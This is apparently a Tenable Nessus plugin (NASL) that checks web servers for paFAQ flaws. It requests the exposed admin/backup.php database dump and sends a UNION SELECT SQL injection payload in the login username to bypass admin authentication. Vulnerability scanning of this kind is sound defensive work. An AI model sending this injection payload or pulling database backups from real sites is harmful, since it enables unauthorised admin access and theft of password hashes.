#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18535);
  script_version("$Revision: 1.2 $");
  script_bugtraq_id(12582, 13999, 14001, 14003);

  name["english"] = "paFAQ Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running paFAQ, a web-based FAQ system implemented
in PHP / MySQL. 

The installed version of paFAQ on the remote host suffers from several
vulnerabilities.  Among the more serious are a SQL injection
vulnerability that enables an attacker to bypass admin authentication
and a 'backup.php' script that allows attackers download paFAQ's
database, complete with the administrator's password hash. 

See also : http://www.gulftech.org/?node=research&article_id=00083-06202005
Solution : Remove the 'backup.php' script and enable PHP's magic quotes gpc.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in paFAQ";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
 if ( thorough_tests )
 {
  # Try to request the database.
  req = http_get(item:string(dir, "/admin/backup.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(1);

  # There's a problem if we could download the database.
  if ("# paFAQ MySQL Dump" >< res) {
    security_hole(port);
    exit(0);
  }
 }

  # Try the admin authenication bypass, in case 'backup.php' was just removed.
  req = http_get(
    item:string(
      dir, "/admin/index.php?",
      "act=login&",
      # nb: this is differs slightly from the Gulftech advisory but
      #     doesn't require us to know the database prefix.
      "username='%20UNION%20SELECT%201,'", SCRIPT_NAME, "','5e0bd03bec244039678f2b955a2595aa','',0,'',''/*&",
      "password=nessus"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(1);

  # There's a problem if we're authenticated.
  if ("Set-Cookie: pafaq_pass=5e0bd03bec244039678f2b955a2595aa" >< res) {
    security_hole(port);
    exit(0);
  }
}
